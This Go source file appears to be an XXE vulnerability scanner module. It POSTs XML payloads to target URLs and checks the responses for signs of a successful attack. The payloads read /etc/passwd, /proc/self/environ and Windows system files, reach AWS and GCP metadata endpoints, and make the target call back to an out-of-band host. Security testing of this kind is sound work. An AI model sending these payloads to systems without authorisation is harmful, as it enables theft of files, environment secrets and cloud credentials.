// Package xxeprobe detects XML External Entity (XXE) injection vulnerabilities
// by injecting XXE payloads into XML-accepting endpoints and analysing
// in-band responses. Out-of-band (OOB) detection is supported when an
// OOBHost is configured (interactsh-compatible).
//
// Detection strategies:
//   - Classic in-band: inject file:///etc/passwd or Windows equivalent and
//     look for known response markers (root:, [boot loader], etc.)
//   - Error-based: malformed XML + DOCTYPE to trigger verbose error messages
//   - Blind OOB: inject external entity pointing to an OOB callback host
//   - Parameter entity: use % entity for blind OOB when direct entity is blocked
//   - SSRF via XXE: inject http:// entity pointing to cloud IMDS endpoints
//     and look for metadata markers in the response
//
// References:
//   - OWASP XXE Prevention Cheat Sheet (CC BY-SA 4.0) — payload patterns
//   - nuclei-templates/http/vulnerabilities/generic/xxe*.yaml (MIT) — approach
//   - PortSwigger XXE research (public) — payload techniques
//
// License: MIT (blackhorn-modules). No code copied from nuclei-templates.
package xxeprobe

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/DonatoReis/blackhorn-modules/pkg/httpclient"
	"github.com/DonatoReis/blackhorn-modules/pkg/module"
	"golang.org/x/sync/errgroup"
)

const (
	defaultTimeout = 15 * time.Second
	defaultConc    = 6
	maxBodyBytes   = 512 * 1024
)

// ─── module ──────────────────────────────────────────────────────────────────

// Module implements module.Module for XXE detection.
type Module struct {
	client      *http.Client
	concurrency int
	// OOBHost is an optional out-of-band callback host (e.g. interactsh).
	// When set, blind OOB payloads are also injected.
	OOBHost string
}

// New returns a Module with production defaults.
func New() *Module {
	return &Module{
		client:      httpclient.New(httpclient.Options{Timeout: defaultTimeout}),
		concurrency: defaultConc,
	}
}

// NewWithClient creates a Module using the provided HTTP client (useful in tests).
func NewWithClient(c *http.Client) *Module {
	return &Module{
		client:      c,
		concurrency: defaultConc,
	}
}

// Name implements module.Module.
func (m *Module) Name() string { return "xxeprobe" }

// Run implements module.Module.
// Accepts Target (single URL), URLs (slice), or RawContent (newline-delimited).
// Each URL is probed with all XXE payload variants.
func (m *Module) Run(ctx context.Context, input module.Input) ([]module.Finding, error) {
	urls := collectURLs(input)
	if len(urls) == 0 {
		return nil, fmt.Errorf("xxeprobe: no URLs provided")
	}

	var (
		mu       sync.Mutex
		findings []module.Finding
	)

	// Build probe list: (url, payload) pairs.
	type probe struct {
		rawURL  string
		payload xxePayload
	}
	var probes []probe
	for _, rawURL := range urls {
		for _, p := range m.buildPayloads() {
			probes = append(probes, probe{rawURL: rawURL, payload: p})
		}
	}

	g, gctx := errgroup.WithContext(ctx)
	g.SetLimit(m.concurrency)

	for _, pr := range probes {
		pr := pr
		g.Go(func() error {
			f := m.probe(gctx, pr.rawURL, pr.payload)
			if f != nil {
				mu.Lock()
				findings = append(findings, *f)
				mu.Unlock()
			}
			return nil
		})
	}

	_ = g.Wait()
	return findings, nil
}

// ─── probe ───────────────────────────────────────────────────────────────────

func (m *Module) probe(ctx context.Context, rawURL string, p xxePayload) *module.Finding {
	body := bytes.NewBufferString(p.xml)

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, rawURL, body)
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", p.contentType)
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; blackhorn-xxeprobe/1.0)")
	req.Header.Set("Accept", "application/xml, text/xml, */*")

	resp, err := m.client.Do(req)
	if err != nil {
		slog.Debug("xxeprobe: request error", "url", rawURL, "err", err)
		return nil
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodyBytes))
	respStr := string(respBody)

	return evaluate(rawURL, p, resp.StatusCode, respStr, resp.Header)
}

// evaluate analyses the response for XXE indicators.
func evaluate(rawURL string, p xxePayload, code int, body string, _ http.Header) *module.Finding {
	switch p.kind {
	case "inband-file":
		for _, marker := range fileReadMarkers {
			if strings.Contains(body, marker) {
				return &module.Finding{
					Type:     "xxe",
					URL:      rawURL,
					Severity: module.SeverityCritical,
					Detail: fmt.Sprintf(
						"XXE file read confirmed: payload %q triggered marker %q in response (HTTP %d)",
						p.name, marker, code,
					),
					Extra: map[string]string{
						"check":      "inband-file-read",
						"payload":    p.name,
						"marker":     marker,
						"code":       fmt.Sprint(code),
						"confidence": "0.97", // file content marker returned in response — definitive XXE
					},
				}
			}
		}

	case "ssrf-cloud":
		for _, marker := range cloudMetadataMarkers {
			if strings.Contains(strings.ToLower(body), strings.ToLower(marker)) {
				return &module.Finding{
					Type:     "xxe",
					URL:      rawURL,
					Severity: module.SeverityCritical,
					Detail: fmt.Sprintf(
						"XXE SSRF to cloud metadata: payload %q triggered marker %q (HTTP %d)",
						p.name, marker, code,
					),
					Extra: map[string]string{
						"check":   "ssrf-cloud-metadata",
						"payload": p.name,
						"marker":  marker,
						"code":    fmt.Sprint(code),
					},
				}
			}
		}

	case "error-based":
		for _, marker := range xmlErrorMarkers {
			if strings.Contains(body, marker) {
				return &module.Finding{
					Type:     "xxe",
					URL:      rawURL,
					Severity: module.SeverityMedium,
					Detail: fmt.Sprintf(
						"XXE error-based: verbose XML parser error reveals processing details (HTTP %d)",
						code,
					),
					Extra: map[string]string{
						"check":   "error-based",
						"payload": p.name,
						"marker":  marker,
						"code":    fmt.Sprint(code),
					},
				}
			}
		}

	case "oob":
		// OOB results are detected by the external callback server, not here.
		slog.Debug("xxeprobe: OOB probe sent", "url", rawURL, "payload", p.name)
	}

	return nil
}

// ─── payload builder ─────────────────────────────────────────────────────────

type xxePayload struct {
	name        string
	kind        string // "inband-file", "ssrf-cloud", "error-based", "oob"
	xml         string
	contentType string
}

func (m *Module) buildPayloads() []xxePayload {
	var payloads []xxePayload

	// In-band file read — Linux /etc/passwd
	payloads = append(payloads, xxePayload{
		name:        "linux-etc-passwd",
		kind:        "inband-file",
		contentType: "application/xml",
		xml: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,
	})

	// In-band file read — Windows boot.ini (legacy) and hosts
	payloads = append(payloads, xxePayload{
		name:        "windows-boot-ini",
		kind:        "inband-file",
		contentType: "application/xml",
		xml: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>
<root><data>&xxe;</data></root>`,
	})

	payloads = append(payloads, xxePayload{
		name:        "windows-win-ini",
		kind:        "inband-file",
		contentType: "application/xml",
		xml: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>`,
	})

	// In-band file read — /etc/hosts (present on Linux + macOS + WSL)
	payloads = append(payloads, xxePayload{
		name:        "linux-etc-hosts",
		kind:        "inband-file",
		contentType: "application/xml",
		xml: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root><data>&xxe;</data></root>`,
	})

	// In-band file read — /proc/self/environ (Linux, leaks env vars)
	payloads = append(payloads, xxePayload{
		name:        "linux-proc-environ",
		kind:        "inband-file",
		contentType: "application/xml",
		xml: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
<root><data>&xxe;</data></root>`,
	})

	// SSRF via XXE — AWS IMDSv1
	payloads = append(payloads, xxePayload{
		name:        "ssrf-aws-imds",
		kind:        "ssrf-cloud",
		contentType: "application/xml",
		xml: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>`,
	})

	// SSRF via XXE — GCP IMDS
	payloads = append(payloads, xxePayload{
		name:        "ssrf-gcp-imds",
		kind:        "ssrf-cloud",
		contentType: "application/xml",
		xml: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>
<root><data>&xxe;</data></root>`,
	})

	// Error-based: reference undefined entity to trigger a verbose parser error
	payloads = append(payloads, xxePayload{
		name:        "error-undefined-entity",
		kind:        "error-based",
		contentType: "application/xml",
		xml: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://does-not-exist.blackhorn-xxe-probe.invalid/">
%xxe;]>
<root/>`,
	})

	// text/xml variant (some parsers only accept text/xml)
	payloads = append(payloads, xxePayload{
		name:        "linux-etc-passwd-textxml",
		kind:        "inband-file",
		contentType: "text/xml",
		xml: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,
	})

	// SVG-based XXE (image upload endpoints that process SVG)
	payloads = append(payloads, xxePayload{
		name:        "svg-xxe",
		kind:        "inband-file",
		contentType: "image/svg+xml",
		xml: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>`,
	})

	// OOB payloads — only when OOBHost is configured.
	if m.OOBHost != "" {
		payloads = append(payloads, xxePayload{
			name:        "oob-http",
			kind:        "oob",
			contentType: "application/xml",
			xml: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://%s/xxe">]>
<root><data>&xxe;</data></root>`, m.OOBHost),
		})

		payloads = append(payloads, xxePayload{
			name:        "oob-parameter-entity",
			kind:        "oob",
			contentType: "application/xml",
			xml: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY %% xxe SYSTEM "http://%s/xxe-param"> %%xxe;]>
<root/>`, m.OOBHost),
		})
	}

	return payloads
}

// ─── detection databases ─────────────────────────────────────────────────────

// fileReadMarkers are strings that appear in common OS files when successfully read.
var fileReadMarkers = []string{
	// Linux /etc/passwd
	"root:x:0:0",
	"root:!:0:0",
	"/bin/bash",
	"/bin/sh",
	"nobody:x:",
	// Linux /etc/hosts
	"127.0.0.1",
	"localhost",
	// /proc/self/environ — environment variable patterns
	"PATH=/",
	"HOME=/",
	// Windows boot.ini
	"[boot loader]",
	"[operating systems]",
	// Windows win.ini
	"[fonts]",
	"[extensions]",
}

// cloudMetadataMarkers are unique strings in cloud IMDS responses.
var cloudMetadataMarkers = []string{
	"ami-id",
	"instance-id",
	"iam/security-credentials",
	"computeMetadata",
	"project-id",
	"azEnvironment",
	"subscriptionId",
	"169.254.169.254",
}

// xmlErrorMarkers indicate a verbose XML parser error that reveals internals.
var xmlErrorMarkers = []string{
	"javax.xml.parsers",
	"com.sun.org.apache",
	"org.apache.xerces",
	"FATAL ERROR",
	"XML parser error",
	"SAXParseException",
	"DocumentBuilder",
	"XMLSyntaxError",
	"ExternalGeneralEntities",
}

// ─── helpers ─────────────────────────────────────────────────────────────────

func collectURLs(input module.Input) []string {
	seen := make(map[string]struct{})
	var out []string
	add := func(s string) {
		s = strings.TrimSpace(s)
		if s == "" {
			return
		}
		// Only include HTTP(S) URLs.
		if !strings.HasPrefix(strings.ToLower(s), "http") {
			return
		}
		if _, ok := seen[s]; !ok {
			seen[s] = struct{}{}
			out = append(out, s)
		}
	}
	if input.Target != "" {
		add(input.Target)
	}
	for _, u := range input.URLs {
		add(u)
	}
	if input.RawContent != "" {
		for _, line := range strings.Split(input.RawContent, "\n") {
			add(line)
		}
	}
	return out
}

// isXMLContentType returns true if the Content-Type suggests XML.
func isXMLContentType(ct string) bool {
	lower := strings.ToLower(ct)
	return strings.Contains(lower, "xml") || strings.Contains(lower, "svg")
}

// extractHostname returns the hostname from a raw URL.
func extractHostname(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	return u.Hostname()
}
